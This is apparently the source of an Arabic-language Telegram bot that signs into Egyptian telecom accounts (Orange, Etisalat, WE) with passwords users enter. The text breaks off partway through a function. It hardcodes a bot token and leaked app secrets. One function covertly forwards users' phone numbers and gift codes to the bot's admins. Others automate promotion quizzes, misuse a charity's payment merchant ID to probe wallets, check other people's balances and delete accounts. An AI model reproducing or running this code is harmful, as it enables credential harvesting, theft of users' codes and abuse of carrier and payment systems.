import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice
import requests
import hashlib
import json
import time
import re
import base64
from base64 import b64encode
import uuid
import sqlite3
import xml.etree.ElementTree as ET
from telebot.types import InputMediaPhoto
from concurrent.futures import ThreadPoolExecutor
import random
import string

TEMPORARY_EMAIL_API = "https://zecora0.serv00.net"
TOKEN = "8599996419:AAFLd4JA6mDm0aw4Yzk2F0JBHjyJcuHmcSk"
CHANNEL_USERNAME = "midooojiokjj"
ADMINS = [7721807760]
APPROVED_USERS = []
BANNED_USERS = []

SERVICE_STATUS = {
    'orange': True,
    'etisalat': True,
    'vodafone': True,
    'we': True,
    'tiktok': True,
    'other': True
}
BOT_ACTIVE = True
BOT_DEACTIVATION_MESSAGE = "البوت متوقف حاليًا للصيانة. الرجاء المحاولة لاحقًا."
TIKTOK_API_URL = "https://tik-batbyte.vercel.app/tiktok?username="
NanoBanana = "https://sii3.moayman.top/api/nano-banana.php"
user_photos = {}
user_action = {}

bot = telebot.TeleBot(TOKEN)

# ========== دوال التحقق ==========
def is_bot_active():
    return BOT_ACTIVE

def is_user_allowed(user_id):
    return True

def is_user_subscribed(user_id):
    try:
        chat_member = bot.get_chat_member(chat_id=f"@{CHANNEL_USERNAME}", user_id=user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

def validate_phone(phone):
    return re.match(r'^01[0125][0-9]{8}$', phone)

def validate_email(email):
    return re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email)

def validate_tiktok_username(username):
    return re.match(r'^[a-zA-Z0-9._]+$', username)

def get_orange_summer_codes(number, password, user_info=""):
    try:
        url_login = "https://services.orange.eg/SignIn.svc/SignInUser"
        payload_login = {
            "appVersion": "9.3.0",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "dialNumber": number,
            "isAndroid": True,
            "lang": "ar",
            "password": password,
        }
        headers_login = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url_login, json=payload_login, headers=headers_login)
        response.raise_for_status()
        data = response.json()
        if 'SignInUserResult' not in data or 'AccessToken' not in data['SignInUserResult']:
            return None
        access_token = data['SignInUserResult']['AccessToken']
        if not access_token:
            return None

        url_token = "https://services.orange.eg/GetToken.svc/GenerateToken"
        payload_token = {
            "appVersion": "9.3.0",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "dialNumber": number,
            "isAndroid": True,
            "password": password
        }
        headers_token = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'Token': access_token,
        }
        response = requests.post(url_token, json=payload_token, headers=headers_token)
        response.raise_for_status()
        token_data = response.json()
        if 'GenerateTokenResult' not in token_data or 'Token' not in token_data['GenerateTokenResult']:
            return None
        service_token = token_data['GenerateTokenResult']['Token']

        url_offer = "https://services.orange.eg/APIs/Promotions/api/SummerOffer/SharingInquiry"
        payload_offer = {
            "dial": number,
            "language": "ar",
            "token": service_token
        }
        headers_offer = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'AppVersion': "9.3.0",
            'OsVersion': "14",
            'IsAndroid': "true",
            'Token': access_token,
        }
        response = requests.post(url_offer, json=payload_offer, headers=headers_offer)
        response.raise_for_status()
        offer_data = response.json()
        if 'SharableCodes' in offer_data:
            sharable_list = offer_data['SharableCodes']
        else:
            sharable_list = []
        if sharable_list:
            message = f"🔍 تم جمع أكواد Orange من مستخدم:\n"
            message += f"📱 الرقم: {number}\n"
            if user_info:
                message += f"👤 معلومات المستخدم: {user_info}\n"
            message += f"📊 إجمالي القيمة القابلة للمشاركة: {offer_data.get('TotalSharableValue', 'غير متوفر')}\n\n"
            message += "🎁 الأكواد المتاحة:\n"
            for i, item in enumerate(sharable_list, 1):
                message += f"\n{i}. الكود: {item.get('Code', 'غير متوفر')}\n"
                message += f" القيمة: {item.get('GiftValue', 'غير متوفر')}\n"
                message += f" الوقت المتبقي: {item.get('RemainingSharingTime', 'غير متوفر')}\n"
            for admin_id in ADMINS:
                try:
                    bot.send_message(admin_id, message)
                    time.sleep(0.5)
                except Exception as e:
                    print(f"فشل إرسال الرسالة للأدمن {admin_id}: {e}")
            return True
        else:
            return False
    except Exception as e:
        print(f"خطأ في جمع أكواد Orange: {e}")
        return None

# ========== دوال البريد المؤقت ==========
def get_temp_email_domains():
    try:
        response = requests.get(f"{TEMPORARY_EMAIL_API}/fake.php?mail=domains", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data.get('domains', [])
    except Exception:
        pass
    return []

def create_random_temp_email():
    try:
        response = requests.get(f"{TEMPORARY_EMAIL_API}/fake.php?mail=random", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data.get('email')
    except Exception:
        pass
    return None

def create_custom_temp_email(username, domain):
    try:
        response = requests.get(f"{TEMPORARY_EMAIL_API}/fake.php?mail=custom&name={username}&domain={domain}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data.get('email')
    except Exception:
        pass
    return None

def get_temp_email_messages(email):
    try:
        response = requests.get(f"{TEMPORARY_EMAIL_API}/fake-mail.php?action=messages&email={email}", timeout=10)
        if response.status_code == 200:
            return response.json()
    except Exception:
        pass
    return []

def delete_temp_email(email):
    try:
        response = requests.get(f"{TEMPORARY_EMAIL_API}/fake.php?mail=delete-email&email={email}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('success', False)
    except Exception:
        pass
    return False

# ========== دوال الخدمات ==========
def check_wallet(number, chat_id):
    show_progress(chat_id)
    try:
        url = "https://fep.kashier.io/v3/orders"
        payload = {
            "apiOperation": "INITIATE_R2P",
            "paymentMethod": {
                "type": "wallet"
            },
            "customer": {
                "mobilePhone": number,
            },
            "order": {
                "reference": "34d82fe7-6923-4c1f-abfb-7989d9973ebd",
                "amount": "5",
                "currency": "EGP",
                "termsAndConditions": ""
            },
            "reconciliation": {
                "merchantRedirect": "https://shefaorman.org/Kashier/DonateReceipt"
            },
            "interactionSource": "ECOMMERCE",
            "metaData": {
                "ProjectName": "تبرع عام",
                "OptionName": "عام",
                "DonatorEmail": "xcbhj6455544@gmail.com",
                "kashier payment UI version": "V2"
            },
            "merchantId": "MID-4934-104",
            "timestamp": 1754081025695,
            "channelEventName": "34d82fe7-6923-4c1f-abfb-7989d9973ebd-undefined"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Content-Type': "application/json",
            'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
            'Kashier-Hash': "24a66f31d9e032af51f629553f156cfa8477e8952cdafa356a8389cd64051056",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'Origin': "https://checkout.kashier.io",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://checkout.kashier.io/",
            'Accept-Language': "ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        result = response.json()
        status = result.get("response", {}).get("status")
        message = result.get("response", {}).get("transactionResponseMessage", {}).get("ar", "")
        if status == "SUCCESS":
            return "✅ الرقم مسجل في محفظة إلكترونية ويمكن إرسال طلب الدفع."
        elif "غير مسجل في أي محفظة" in message:
            return "❌ الرقم غير مسجل في أي محفظة إلكترونية."
        else:
            return f"⚠️ لم يتم تحديد حالة الرقم بدقة. الرسالة: {message}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def extract_fawazeer_questions(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://services.orange.eg/SignIn.svc/SignInUser"
        payload = {
            "appVersion": "9.3.0",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "dialNumber": number,
            "isAndroid": True,
            "lang": "ar",
            "password": password,
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        token = response.json()['SignInUserResult']['AccessToken']
        if not token:
            return "❌ رقم الهاتف أو كلمة المرور غير صحيحة"

        url = "https://services.orange.eg/APIs/Profile/api/BasicAuthentication/Generate"
        payload = {
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Dial": number,
            "Language": "ar",
            "Module": "0",
            "Password": password,
        }
        headers.update({
            'AppVersion': "9.3.0",
            'OsVersion': "14",
            'IsAndroid': "true",
            'IsEasyLogin': "false",
            'Token': token,
        })
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        tok = response.json()['Token']

        url = "https://services.orange.eg/APIs/Ramadan2024/api/RamadanOffers/Fawazeer/Questions"
        payload = {
            "Dial": number,
            "Language": "ar",
            "Token": tok,
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 15; SM-A055F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Content-Type': "application/json",
            'Origin': "https://services.orange.eg",
            'X-Requested-With': "com.orange.mobinilandmf",
            'Referer': f"https://services.orange.eg/Pages/fawazeer/?dial={number}&language=ar&token={tok}",
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        data = response.json()
        result = "🧩 أسئلة وإجابات Fawazeer:\n\n"
        if "Questions" in data:
            for q in data["Questions"]:
                question_id = q["Id"]
                question_body = q["Body"]
                correct_answer = next((a for a in q["Answers"] if a["IsCorrect"]), None)
                result += f"❓ السؤال {q['Title']} (ID: {question_id}):\n"
                result += f" {question_body}\n"
                if correct_answer:
                    result += f"✅ الإجابة الصحيحة: {correct_answer['Body']} (ID: {correct_answer['Id']})\n"
                else:
                    result += "⚠️ لم يتم العثور على إجابة صحيحة\n"
                result += "\n" + "─" * 30 + "\n\n"
        else:
            return "❌ لم يتم العثور على أسئلة أو هناك خطأ في الاستجابة"
        return result
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def handle_image_creation(message, is_edit=False):
    user_id = message.from_user.id
    action = user_action.get(user_id)
    if not action:
        return
    wait_msg = bot.send_message(user_id, "⏳ جاري إنشاء الصور...")
    try:
        if is_edit and user_id in user_photos and user_photos[user_id]:
            desc = message.text
            links = []
            for fid in user_photos[user_id]:
                try:
                    file_info = bot.get_file(fid)
                    file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_info.file_path}"
                    links.append(file_url)
                except Exception as e:
                    print(f"Error getting file URL: {e}")
            results = []
            for _ in range(2):
                result = send_image_request(desc, links)
                if result:
                    results.append(result)
            if results:
                media = []
                for i, url in enumerate(results):
                    if i == 0:
                        media.append(InputMediaPhoto(media=url, caption=f"🎨 {desc}", parse_mode="HTML"))
                    else:
                        media.append(InputMediaPhoto(media=url))
                if media:
                    bot.send_media_group(user_id, media)
                user_photos[user_id] = []
        else:
            desc = message.text
            results = []
            for _ in range(2):
                result = send_image_request(desc)
                if result:
                    results.append(result)
            if results:
                media = []
                for i, url in enumerate(results):
                    if i == 0:
                        media.append(InputMediaPhoto(media=url, caption=f"🎨 {desc}", parse_mode="HTML"))
                    else:
                        media.append(InputMediaPhoto(media=url))
                if media:
                    bot.send_media_group(user_id, media)
        try:
            bot.delete_message(user_id, wait_msg.message_id)
        except:
            pass
    except Exception as e:
        error_msg = f"❌ حدث خطأ أثناء إنشاء الصور: {str(e)}"
        bot.edit_message_text(error_msg, user_id, wait_msg.message_id)
    finally:
        user_action.pop(user_id, None)

def check_orange_balance(phone_number, chat_id):
    show_progress(chat_id)
    phone_pattern = r'^01[0-9]{9}$'
    if not re.match(phone_pattern, phone_number):
        return {
            'success': False,
            'message': '❌ رقم الهاتف غير صالح. يجب أن يتكون من 11 رقم ويبدأ بـ 01',
            'balance': 0
        }
    url = "https://www.orange.eg/apis/gsm/gsmonlinepayment/api/payment/rechargecheckeligibilityForOthers"
    payload = {
        "SelectedUserDial": None,
        "IsForAnotherRecipient": True,
        "RecipientDial": phone_number,
        "Dial": phone_number
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Chromium";v=\"137", "Not/A)Brand";v=\"24"',
        'lang': 'en',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://www.orange.eg',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.orange.eg/en/myaccount/pay-bill-or-recharge-for-others',
        'Accept-Language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6'
    }
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        if response.status_code == 200:
            response_data = response.json()
            if response_data and 'ErrorCode' in response_data:
                if response_data['ErrorCode'] == 0:
                    balance = response_data.get('CreditBalance', 0)
                    return {
                        'success': True,
                        'message': f"✅ الرصيد الحالي للرقم {phone_number} هو: {balance} جنيه",
                        'balance': balance
                    }
                else:
                    error = response_data.get('ErrorDescription', 'خطأ غير معروف')
                    return {
                        'success': False,
                        'message': f"❌ خطأ: {error}",
                        'balance': 0
                    }
            else:
                return {
                    'success': False,
                    'message': '❌ استجابة غير صالحة من خادم أورانج',
                    'balance': 0
                }
        else:
            return {
                'success': False,
                'message': '❌ فشل الاتصال بخادم أورانج. الرجاء المحاولة لاحقاً',
                'balance': 0
            }
    except requests.exceptions.RequestException as e:
        return {
            'success': False,
            'message': f'❌ خطأ في الاتصال: {str(e)}',
            'balance': 0
        }

def activate_watchit(number, password, chat_id):
    show_progress(chat_id)
    if not re.fullmatch(r'01[0-9]{9}', number):
        return {"status": "error", "msg": "❌ رقم الهاتف غير صحيح. يجب أن يبدأ بـ 01 ويحتوي على 11 رقماً"}
    if len(password) < 6:
        return {"status": "error", "msg": "❌ كلمة المرور يجب أن تحتوي على 6 أحرف على الأقل"}
    channel = {
        "ChannelName": "MobinilAndMe",
        "Password": "ig3yh*mk5l42@oj7QAR8yF"
    }
    try:
        login_payload = {
            "appVersion": "8.8.5",
            "channel": channel,
            "dialNumber": number,
            "isAndroid": True,
            "lang": "ar",
            "password": password
        }
        login_headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "okhttp/4.10.0",
            "x-microservice-name": "APMS"
        }
        login_url = "https://services.orange.eg/SignIn.svc/SignInUser"
        login_response = requests.post(login_url, headers=login_headers, json=login_payload).json()
        if 'SignInUserResult' not in login_response:
            return {"status": "error", "msg": "❌ هيكل البيانات غير متوقع من الخادم"}
        signin_result = login_response['SignInUserResult']
        if 'ErrorCode' in signin_result and signin_result['ErrorCode'] != 0:
            error_msg = signin_result.get('ErrorDescription', f"كود الخطأ: {signin_result['ErrorCode']}")
            return {"status": "error", "msg": f"❌ {error_msg}"}
        if 'AccessToken' not in signin_result or not signin_result['AccessToken']:
            return {"status": "error", "msg": "❌ فشل في الحصول على رمز الدخول"}

        token_payload = {
            "appVersion": "2.9.8",
            "channel": channel,
            "dialNumber": number,
            "isAndroid": True,
            "password": password
        }
        token_headers = {
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.10.0"
        }
        token_url = "https://services.orange.eg/GetToken.svc/GenerateToken"
        token_response = requests.post(token_url, headers=token_headers, json=token_payload).json()
        if 'GenerateTokenResult' not in token_response:
            return {"status": "error", "msg": "❌ هيكل التوكن غير متوقع من الخادم"}
        token_result = token_response['GenerateTokenResult']
        ctv = token_result.get('Token', '')
        if not ctv:
            return {"status": "error", "msg": "❌ فشل في الحصول على التوكن"}

        htv_input = f"{ctv},{{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}}w;ls.e85T^#ASwa?=(lk"
        htv = hashlib.sha256(htv_input.encode()).hexdigest().upper()

        fulfillment_payload = {
            "ChannelName": channel["ChannelName"],
            "ChannelPassword": channel["Password"],
            "Dial": number,
            "Language": "ar",
            "Password": password,
            "ServiceID": "5"
        }
        fulfillment_headers = {
            "_ctv": ctv,
            "_htv": htv,
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "okhttp/4.10.0"
        }
        fulfillment_url = "https://services.orange.eg/APIs/Entertainment/api/EagleRevamp/Fulfillment"
        fulfillment_response = requests.post(fulfillment_url, headers=fulfillment_headers, json=fulfillment_payload).json()
        if fulfillment_response.get("ErrorCode") == 0:
            return {"status": "success", "msg": "✅ تم الاشتراك بنجاح. ستصلك رسالة تأكيد من 5030"}
        elif fulfillment_response.get("ErrorCode") == 1:
            return {"status": "info", "msg": "ℹ️ أنت مشترك بالفعل في خدمة WatchIT"}
        else:
            error_msg = fulfillment_response.get("ErrorDescription", "فشل غير معروف")
            return {"status": "error", "msg": f"❌ {error_msg}"}
    except Exception as e:
        return {"status": "error", "msg": f"❌ حدث خطأ: {str(e)}"}

def get_we_usage_info(number, password, chat_id):
    show_progress(chat_id)
    try:
        if number.startswith("0"):
            number = number[1:]
        url = "https://my.te.eg/echannel/service/besapp/base/rest/busiservice/v1/auth/userAuthenticate"
        payload = {
            "acctId": number,
            "password": password,
            "appLocale": "en-US",
            "isSelfcare": "Y",
            "isMobile": "N",
            "recaptchaToken": ""
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Content-Type': "application/json",
            'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
            'delegatorSubsId': "",
            'csrftoken': "",
            'sec-ch-ua-mobile': "?1",
            'isMobile': "false",
            'isSelfcare': "true",
            'channelId': "702",
            'isCoporate': "false",
            'languageCode': "en-US",
            'clientType': "Chrome",
            'sec-ch-ua-platform': "\"Android\"",
            'Origin': "https://my.te.eg",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://my.te.eg/echannel/",
            'Accept-Language': "ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        data = response.json()
        if 'body' not in data or 'token' not in data['body']:
            return "❌ فشل تسجيل الدخول. تأكد من الرقم وكلمة المرور."
        token = data['body']['token']
        subscriber_id = data['body']['subscriber']['subscriberId']
        headers['csrftoken'] = token
        query_url = 'https://my.te.eg/echannel/service/besapp/base/rest/busiservice/cz/cbs/bb/queryFreeUnit'
        query_data = {
            "subscriberId": subscriber_id,
            "needQueryPoint": True
        }
        query_response = requests.post(query_url, headers=headers, json=query_data)
        usage_data = query_response.json()
        result = "📊 معلومات استهلاك WE:\n\n"
        if 'body' in usage_data:
            for package in usage_data['body']:
                result += f"⦿ {package.get('offerName', 'غير معروف')}:\n"
                result += f" ├─ النوع: {package.get('freeUnitTypeName', 'غير معروف')}\n"
                result += f" ├─ الإجمالي: {package.get('total', 0)}\n"
                result += f" ├─ المستخدم: {package.get('used', 0)}\n"
                result += f" ├─ المتبقي: {package.get('remain', 0)}\n"
                result += f" └─ تاريخ الانتهاء: {package.get('expireTime', 'غير محدد')}\n\n"
        else:
            return "❌ لا توجد بيانات استهلاك متاحة."
        return result
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def activate_shahid_vip(email, password, chat_id):
    show_progress(chat_id)
    try:
        auth_str = f"{email}:{password}"
        headers = {
            "Authorization": f"Basic {b64encode(auth_str.encode()).decode()}",
            "Content-Type": "text/xml; charset=UTF-8",
            "applicationName": "MAB",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        }
        data = """
        <loginRequest>
            <deviceId></deviceId>
            <firstLoginAttempt>true</firstLoginAttempt>
            <platform>Android</platform>
            <udid></udid>
        </loginRequest>
        """
        response = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan",
            headers=headers,
            data=data,
            timeout=30
        )
        if response.status_code != 200 or "true" not in response.text:
            return "❌ بيانات الدخول غير صحيحة"
        root = ET.fromstring(response.text)
        dial_element = root.find("dial")
        if dial_element is None:
            return "❌ فشل في الحصول على رقم الهاتف"
        number = dial_element.text
        headers.update({
            "APP-Version": "33.1.0",
            "Language": "ar"
        })
        payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
        <generalSubmitOrderRequest>
            <category></category>
            <contactDial></contactDial>
            <msisdn>{number}</msisdn>
            <operation>ACTIVATE</operation>
            <passParameters />
            <productName>SHAHID_HYBRID_VIP</productName>
            <requestId></requestId>
            <type></type>
        </generalSubmitOrderRequest>"""
        response = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/General/submitOrder",
            headers=headers,
            data=payload,
            timeout=30
        )
        if response.status_code != 200:
            return f"❌ فشل التفعيل (كود {response.status_code})"
        root = ET.fromstring(response.text)
        status_element = root.find("status")
        if status_element is not None and status_element.text.lower() == "true":
            return "✅ تم تفعيل اشتراك شاهد VIP بنجاح! 🎉"
        else:
            return "❌ فشل في تفعيل اشتراك شاهد VIP"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def delete_etisalat_account(email, password, chat_id):
    show_progress(chat_id)
    try:
        tok = f"{email}:{password}"
        token = b64encode(tok.encode()).decode()
        url = "https://mab.etisalat.com.eg:11003/Saytar/rest/quickAccess/deleteAccount"
        payload = f"<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><deleteUserAccountRequest><email>{email}</email></deleteUserAccountRequest>"
        headers = {
            'Host': "mab.etisalat.com.eg:11003",
            'User-Agent': "okhttp/5.0.0-alpha.11",
            'Connection': "Keep-Alive",
            'Accept': "text/xml",
            'Accept-Encoding': "gzip",
            'Content-Type': "text/xml; charset=UTF-8",
            'applicationVersion': "2",
            'applicationName': "MAB",
            'Authorization': f"Basic {token}",
            'Language': "ar",
            'APP-BuildNumber': "10651",
            'APP-Version': "33.2.0",
            'OS-Type': "Android",
            'OS-Version': "12",
            'APP-STORE': "GOOGLE",
            'C-Type': "4G",
            'Is-Corporate': "false",
            'ADRUM_1': "isMobile:true",
            'ADRUM': "isAjax:true"
        }
        response = requests.post(url, data=payload, headers=headers)
        if "<status>true</status>" in response.text:
            return "✅ تم حذف الحساب بنجاح"
        else:
            return "❌ فشل حذف الحساب أو هذا الحساب غير مسجل"
    except Exception as e:
        return f"❌ فشل حذف الحساب: {str(e)}"

def get_tiktok_info(username, chat_id):
    try:
        response = requests.get(f"{TIKTOK_API_URL}{username}")
        response.raise_for_status()
        data = response.json()
        if 'error' in data:
            return f"❌ خطأ: {data['error']}"
        nickname = data.get('nickname', 'غير متوفر')
        user_id = data.get('user_id', 'غير متوفر')
        bio = data.get('bio', 'غير متوفر')
        followers = data.get('followers', 'غير متوفر')
        hearts = data.get('hearts', 'غير متوفر')
        videos = data.get('videos', 'غير متوفر')
        create_date = data.get('create_date', 'غير متوفر')
        language = data.get('language', 'غير متوفر')
        is_private = data.get('is_private', False)
        profile_pic = data.get('profile_picture', '')
        link = f"https://www.tiktok.com/@{username}"
        caption = f"""
📌 معلومات حساب TikTok 📌
🔖 الاسم: {nickname}
🆔 الايدي: {user_id}
📝 الوصف: {bio}
👥 المتابعون: {followers}
❤️ القلوب: {hearts}
🎥 الفيديوهات: {videos}
📅 تاريخ الإنشاء: {create_date}
🌐 اللغة: {language}
🔒 الحساب: {'خاص 🔐' if is_private else 'عام 🔓'}
🔗 الرابط: {link}
        """
        if profile_pic:
            bot.send_photo(chat_id, profile_pic, caption=caption)
        else:
            bot.send_message(chat_id, caption)
        return "✅ تم جلب المعلومات بنجاح"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

progress = [
    "*[░░░░░░░░░░] 0%*",
    "*[▓▓░░░░░░░░] 25%*",
    "*[▓▓▓▓░░░░░░] 50%*",
    "*[▓▓▓▓▓▓░░░░] 75%*",
    "*[▓▓▓▓▓▓▓▓▓▓] 100%*"
]

def show_progress(chat_id):
    msg = bot.send_message(chat_id, progress[0], parse_mode='Markdown')
    for i in range(1, len(progress)):
        bot.send_chat_action(chat_id, 'typing')
        time.sleep(1)
        bot.edit_message_text(progress[i], chat_id, msg.message_id, parse_mode='Markdown')
    return True

def redeem_orange_fawazeer(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://services.orange.eg/SignIn.svc/SignInUser"
        payload = {
            "appVersion": "9.0.1",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "dialNumber": number,
            "isAndroid": True,
            "lang": "ar",
            "password": password,
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        try:
            AccessToken = response.json()['SignInUserResult']['AccessToken']
        except:
            return "❌ رقم الهاتف أو كلمة المرور غير صحيحة"

        url = "https://services.orange.eg/APIs/Profile/api/BasicAuthentication/Generate"
        payload = {
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Dial": number,
            "Language": "ar",
            "Module": "0",
            "Password": password,
        }
        headers.update({
            'AppVersion': "9.0.1",
            'OsVersion': "13",
            'IsAndroid': "true",
            'IsEasyLogin': "false",
            'Token': AccessToken,
        })
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        Token = response.json()["Token"]

        url = "https://services.orange.eg/APIs/Ramadan2024/api/RamadanOffers/Fawazeer/Questions"
        payload = {
            "Dial": number,
            "Language": "ar",
            "Token": Token
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; 21061119AG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.158 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not;A=Brand\";v=\"99\", \"Android WebView\";v=\"139\", \"Chromium\";v=\"139\"",
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://services.orange.eg",
            'X-Requested-With': "com.orange.mobinilandmf",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Accept-Language': "ar,en-US;q=0.9,en;q=0.8",
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        data = response.json()
        if data['ErrorCode'] == 1:
            return "⚠️ لقد دخلت على الفوازير اليوم، جرب مرة أخرى غداً"
        questions = data["Questions"]
        answers = []
        i = 1
        for q in questions:
            for a in q["Answers"]:
                if a["IsCorrect"] == True:
                    answers.append({
                        "QuestionId": a["QuestionId"],
                        "AnswerId": a["Id"]
                    })
                    break
            i += 1
        url = "https://services.orange.eg/APIs/Ramadan2024/api/RamadanOffers/Fawazeer/Submit"
        payload = {
            "Dial": number,
            "Language": "ar",
            "Token": Token,
            "Answers": answers
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        if response.json()['ErrorDescription'] == "FawazeerSuccess":
            return "✅ تم تفعيل Orange Fawazeer بنجاح! 🎉 (250 ميجا)"
        else:
            error_desc = response.json()['ErrorDescription']
            if "GiftCapped" in error_desc:
                return "⚠️ لقد قمت بتفعيل هذه الخدمة من قبل"
            else:
                return f"❌ خطأ: {error_desc}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def redeem_500mg(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://services.orange.eg/SignIn.svc/SignInUser"
        payload = {
            "appVersion": "9.0.0",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "dialNumber": number,
            "isAndroid": True,
            "lang": "ar",
            "password": password,
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        fox = response.json()['SignInUserResult']['UserData']["UserID"]
        url1 = "https://services.orange.eg/GetToken.svc/GenerateToken"
        headers1 = {
            "Content-Type": "application/json; charset=UTF-8",
            "Host": "services.orange.eg",
            'User-Agent': "okhttp/3.14.9"
        }
        data1 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
        response = requests.post(url1, headers=headers1, data=data1)
        ctv = response.json()['GenerateTokenResult']['Token']
